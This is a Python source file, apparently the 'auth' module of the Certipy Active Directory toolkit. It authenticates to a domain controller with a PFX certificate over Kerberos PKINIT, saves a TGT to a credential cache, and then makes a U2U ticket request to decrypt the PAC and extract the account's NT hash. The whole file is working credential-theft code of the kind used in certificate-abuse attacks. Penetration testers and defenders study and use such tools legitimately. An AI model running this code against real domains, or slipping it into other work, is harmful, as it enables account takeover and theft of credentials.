import argparse
import datetime
import logging
from random import getrandbits
from typing import Callable, Tuple, Union

from asn1crypto import cms, core
from impacket.dcerpc.v5.rpcrt import TypeSerialization1
from impacket.krb5 import constants
from impacket.krb5.asn1 import (
    AD_IF_RELEVANT,
    AP_REQ,
    AS_REP,
    TGS_REP,
    TGS_REQ,
    Authenticator,
    EncASRepPart,
    EncTicketPart,
)
from impacket.krb5.asn1 import Ticket as TicketAsn1
from impacket.krb5.asn1 import seq_set, seq_set_iter
from impacket.krb5.ccache import CCache
from impacket.krb5.crypto import Key, _enctype_table
from impacket.krb5.kerberosv5 import KerberosError, sendReceive
from impacket.krb5.pac import (
    NTLM_SUPPLEMENTAL_CREDENTIAL,
    PAC_CREDENTIAL_DATA,
    PAC_CREDENTIAL_INFO,
    PAC_INFO_BUFFER,
    PACTYPE,
)
from impacket.krb5.types import KerberosTime, Principal, Ticket
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue

from certipy.certificate import (
    get_id_from_certificate,
    hash_digest,
    hashes,
    load_pfx,
    rsa,
    x509,
)
from certipy.pkinit import PA_PK_AS_REP, Enctype, KDCDHKeyInfo, build_pkinit_as_req
from certipy.target import Target

NAME = "auth"


def truncate_key(value: bytes, keysize: int) -> bytes:
    output = b""
    current_num = 0
    while len(output) < keysize:
        current_digest = hash_digest(bytes([current_num]) + value, hashes.SHA1)
        if len(output) + len(current_digest) > keysize:
            output += current_digest[: keysize - len(output)]
            break
        output += current_digest
        current_num += 1

    return output


def cert_id_to_parts(id_type: str, identification: str) -> Tuple[str, str]:
    if id_type == "DNS Host Name":
        parts = identification.split(".")
        if len(parts) == 1:
            cert_username = identification
            cert_domain = ""
        else:
            cert_username = parts[0] + "$"
            cert_domain = ".".join(parts[1:])
    elif id_type == "UPN":
        parts = identification.split("@")
        if len(parts) == 1:
            cert_username = identification
            cert_domain = ""
        else:
            cert_username = "@".join(parts[:-1])
            cert_domain = parts[-1]
    else:
        return (None, None)
    return (cert_username, cert_domain)


class Authenticate:
    def __init__(
        self,
        target: Target = None,
        pfx: str = None,
        cert: x509.Certificate = None,
        key: rsa.RSAPublicKey = None,
        no_ccache: bool = False,
        no_hash: bool = False,
        debug=False,
        **kwargs
    ):
        self.target = target
        self.pfx = pfx
        self.cert = cert
        self.key = key
        self.no_ccache = no_ccache
        self.no_hash = no_hash
        self.verbose = debug
        self.kwargs = kwargs

        self.nt_hash: str = None

        if self.pfx is not None:
            with open(self.pfx, "rb") as f:
                self.key, self.cert = load_pfx(f.read())

    def authenticate(
        self, username: str = None, domain: str = None, is_key_credential=False
    ) -> Union[str, bool]:
        if username is None:
            username = self.target.username
        if domain is None:
            domain = self.target.domain

        if not is_key_credential:
            id_type, identification = get_id_from_certificate(self.cert)
            cert_username, cert_domain = cert_id_to_parts(id_type, identification)

            if not any([cert_username, cert_domain]):
                logging.warning(
                    "Could not find identification in the provided certificate"
                )

            if not username:
                username = cert_username
            elif cert_username:
                if username.lower() not in [
                    cert_username.lower(),
                    cert_username.lower() + "$",
                ]:
                    logging.warning(
                        (
                            "The provided username does not match the identification "
                            "found in the provided certificate: %s - %s"
                        )
                        % (repr(username), repr(cert_username))
                    )
                    res = input("Do you want to continue? (Y/n) ").rstrip("\n")
                    if res.lower() == "n":
                        return False
            if not domain:
                domain = cert_domain
            elif cert_domain:
                if (
                    domain.lower() != cert_domain.lower()
                    and not cert_domain.lower().startswith(
                        domain.lower().rstrip(".") + "."
                    )
                ):
                    logging.warning(
                        (
                            "The provided domain does not match the identification "
                            "found in the provided certificate: %s - %s"
                        )
                        % (repr(domain), repr(cert_domain))
                    )
                    res = input("Do you want to continue? (Y/n) ").rstrip("\n")
                    if res.lower() == "n":
                        return False

        if not all([username, domain]) and not is_key_credential:
            logging.error(
                (
                    "Username or domain is not specified, and identification "
                    "information was not found in the certificate"
                )
            )
            return False

        if not any([len(username), len(domain)]):
            logging.error("Username or domain is invalid: %s@%s" % (username, domain))
            return False

        domain = domain.lower()
        username = username.lower()
        upn = "%s@%s" % (username, domain)

        if self.target.target_ip is None:
            self.target.target_ip = self.target.resolver.resolve(domain)

        logging.info("Using principal: %s" % upn)

        as_req, diffie = build_pkinit_as_req(username, domain, self.key, self.cert)

        logging.info("Trying to get TGT...")

        try:
            tgt = sendReceive(encoder.encode(as_req), domain, self.target.target_ip)
        except KerberosError as e:
            if "KDC_ERR_CLIENT_NAME_MISMATCH" in str(e) and not is_key_credential:
                logging.error(
                    ("Name mismatch between certificate and user %s" % repr(username))
                )
                if id_type is not None:
                    logging.error(
                        ("Verify that the username %s matches the certificate %s: %s")
                        % (repr(username), id_type, identification)
                    )
            elif "KDC_ERR_WRONG_REALM" in str(e) and not is_key_credential:
                logging.error(("Wrong domain name specified %s" % repr(domain)))
                if id_type is not None:
                    logging.error(
                        ("Verify that the domain %s matches the certificate %s: %s")
                        % (repr(domain), id_type, identification)
                    )
            else:
                logging.error("Got error while trying to request TGT: %s" % str(e))

            return False

        logging.info("Got TGT")

        as_rep = decoder.decode(tgt, asn1Spec=AS_REP())[0]

        for pa in as_rep["padata"]:
            if pa["padata-type"] == 17:
                pk_as_rep = PA_PK_AS_REP.load(bytes(pa["padata-value"])).native
                break
        else:
            logging.error("PA_PK_AS_REP was not found in AS_REP")
            return False

        ci = cms.ContentInfo.load(pk_as_rep["dhSignedData"]).native
        sd = ci["content"]
        key_info = sd["encap_content_info"]

        if key_info["content_type"] != "1.3.6.1.5.2.3.2":
            logging.error("Unexpected value for key info content type")
            return False

        auth_data = KDCDHKeyInfo.load(key_info["content"]).native
        pub_key = int(
            "".join(["1"] + [str(x) for x in auth_data["subjectPublicKey"]]), 2
        )
        pub_key = int.from_bytes(
            core.BitString(auth_data["subjectPublicKey"]).dump()[7:],
            "big",
            signed=False,
        )
        shared_key = diffie.exchange(pub_key)

        server_nonce = pk_as_rep["serverDHNonce"]
        full_key = shared_key + diffie.dh_nonce + server_nonce

        etype = as_rep["enc-part"]["etype"]
        cipher = _enctype_table[etype]
        if etype == Enctype.AES256:
            t_key = truncate_key(full_key, 32)
        elif etype == Enctype.AES128:
            t_key = truncate_key(full_key, 16)
        else:
            logging.error("Unexpected encryption type in AS_REP")
            return False

        key = Key(cipher.enctype, t_key)
        enc_data = as_rep["enc-part"]["cipher"]
        dec_data = cipher.decrypt(key, 3, enc_data)
        enc_as_rep_part = decoder.decode(dec_data, asn1Spec=EncASRepPart())[0]

        cipher = _enctype_table[int(enc_as_rep_part["key"]["keytype"])]
        session_key = Key(cipher.enctype, bytes(enc_as_rep_part["key"]["keyvalue"]))

        if not self.no_ccache:
            ccache = CCache()
            ccache.fromTGT(tgt, key, None)
            self.ccache_name = "%s.ccache" % username.rstrip("$")
            ccache.saveFile(self.ccache_name)
            logging.info("Saved credential cache to %s" % repr(self.ccache_name))

        if not self.no_hash:
            logging.info("Trying to retrieve NT hash for %s" % repr(username))

            # Try to extract NT hash via U2U
            # https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py
            # AP_REQ
            ap_req = AP_REQ()
            ap_req["pvno"] = 5
            ap_req["msg-type"] = int(constants.ApplicationTagNumbers.AP_REQ.value)

            opts = []
            ap_req["ap-options"] = constants.encodeFlags(opts)

            ticket = Ticket()
            ticket.from_asn1(as_rep["ticket"])

            seq_set(ap_req, "ticket", ticket.to_asn1)

            authenticator = Authenticator()
            authenticator["authenticator-vno"] = 5

            authenticator["crealm"] = bytes(as_rep["crealm"])

            client_name = Principal()
            client_name.from_asn1(as_rep, "crealm", "cname")

            seq_set(authenticator, "cname", client_name.components_to_asn1)

            now = datetime.datetime.utcnow()
            authenticator["cusec"] = now.microsecond
            authenticator["ctime"] = KerberosTime.to_asn1(now)

            encoded_authenticator = encoder.encode(authenticator)

            encrypted_encoded_authenticator = cipher.encrypt(
                session_key, 7, encoded_authenticator, None
            )

            ap_req["authenticator"] = noValue
            ap_req["authenticator"]["etype"] = cipher.enctype
            ap_req["authenticator"]["cipher"] = encrypted_encoded_authenticator

            encoded_ap_req = encoder.encode(ap_req)

            # TGS_REQ
            tgs_req = TGS_REQ()

            tgs_req["pvno"] = 5
            tgs_req["msg-type"] = int(constants.ApplicationTagNumbers.TGS_REQ.value)

            tgs_req["padata"] = noValue
            tgs_req["padata"][0] = noValue
            tgs_req["padata"][0]["padata-type"] = int(
                constants.PreAuthenticationDataTypes.PA_TGS_REQ.value
            )
            tgs_req["padata"][0]["padata-value"] = encoded_ap_req

            req_body = seq_set(tgs_req, "req-body")

            opts = []
            opts.append(constants.KDCOptions.forwardable.value)
            opts.append(constants.KDCOptions.renewable.value)
            opts.append(constants.KDCOptions.canonicalize.value)
            opts.append(constants.KDCOptions.enc_tkt_in_skey.value)
            opts.append(constants.KDCOptions.forwardable.value)
            opts.append(constants.KDCOptions.renewable_ok.value)

            req_body["kdc-options"] = constants.encodeFlags(opts)

            server_name = Principal(
                username, type=constants.PrincipalNameType.NT_UNKNOWN.value
            )

            seq_set(req_body, "sname", server_name.components_to_asn1)

            req_body["realm"] = str(as_rep["crealm"])

            now = datetime.datetime.utcnow() + datetime.timedelta(days=1)

            req_body["till"] = KerberosTime.to_asn1(now)
            req_body["nonce"] = getrandbits(31)
            seq_set_iter(
                req_body,
                "etype",
                (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)),
            )

            ticket = ticket.to_asn1(TicketAsn1())
            seq_set_iter(req_body, "additional-tickets", (ticket,))
            message = encoder.encode(tgs_req)

            tgs = sendReceive(message, domain, self.target.target_ip)

            tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]

            ciphertext = tgs["ticket"]["enc-part"]["cipher"]

            new_cipher = _enctype_table[int(tgs["ticket"]["enc-part"]["etype"])]

            plaintext = new_cipher.decrypt(session_key, 2, ciphertext)
            special_key = Key(18, t_key)

            data = plaintext
            enc_ticket_part = decoder.decode(data, asn1Spec=EncTicketPart())[0]
            ad_if_relevant = decoder.decode(
                enc_ticket_part["authorization-data"][0]["ad-data"],
                asn1Spec=AD_IF_RELEVANT(),
            )[0]
            pac_type = PACTYPE(ad_if_relevant[0]["ad-data"].asOctets())
            buff = pac_type["Buffers"]

            nt_hash = None
            for _ in range(pac_type["cBuffers"]):
                info_buffer = PAC_INFO_BUFFER(buff)
                data = pac_type["Buffers"][info_buffer["Offset"] - 8 :][
                    : info_buffer["cbBufferSize"]
                ]
                if info_buffer["ulType"] == 2:
                    cred_info = PAC_CREDENTIAL_INFO(data)
                    new_cipher = _enctype_table[cred_info["EncryptionType"]]
                    out = new_cipher.decrypt(
                        special_key, 16, cred_info["SerializedData"]
                    )
                    type1 = TypeSerialization1(out)
                    new_data = out[len(type1) + 4 :]
                    pcc = PAC_CREDENTIAL_DATA(new_data)
                    for cred in pcc["Credentials"]:
                        cred_structs = NTLM_SUPPLEMENTAL_CREDENTIAL(
                            b"".join(cred["Credentials"])
                        )
                        nt_hash = cred_structs["NtPassword"].hex()
                        break
                    break

                buff = buff[len(info_buffer) :]
            else:
                logging.error("Could not find credentials in PAC")
                return False

            self.nt_hash = nt_hash

            if not is_key_credential:
                logging.info("Got NT hash for %s: %s" % (repr(upn), nt_hash))

            return nt_hash

        return False


def entry(options: argparse.Namespace) -> None:
    options.no_pass = True
    target = Target.create(
        domain=options.domain,
        username=options.username,
        dc_ip=options.dc_ip,
        target_ip=options.dc_ip,
        ns=options.ns,
        timeout=options.timeout,
        dns_tcp=options.dns_tcp,
    )

    authenticate = Authenticate(target=target, **vars(options))
    authenticate.authenticate()


def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable]:
    subparser = subparsers.add_parser(NAME, help="Authenticate using certificates")

    subparser.add_argument(
        "-pfx",
        action="store",
        metavar="pfx/p12 file name",
        help="Path to certificate",
        required=True,
    )

    subparser.add_argument("-no-ccache", action="store_true", help="Don't save CCache")
    subparser.add_argument(
        "-no-hash", action="store_true", help="Don't request NT hash"
    )
    subparser.add_argument("-debug", action="store_true", help="Turn debug output on")

    group = subparser.add_argument_group("connection options")

    group.add_argument(
        "-dc-ip",
        action="store",
        metavar="ip address",
        help="IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in "
        "the target parameter",
    )
    group.add_argument(
        "-ns",
        action="store",
        metavar="nameserver",
        help="Nameserver for DNS resolution",
    )
    group.add_argument(
        "-dns-tcp", action="store_true", help="Use TCP instead of UDP for DNS queries"
    )
    group.add_argument(
        "-timeout",
        action="store",
        metavar="seconds",
        help="Timeout for connections",
        default=5,
        type=int,
    )

    group = subparser.add_argument_group("authentication options")
    group.add_argument(
        "-username",
        action="store",
        metavar="username",
    )
    group.add_argument(
        "-domain",
        action="store",
        metavar="domain",
    )

    return NAME, entry
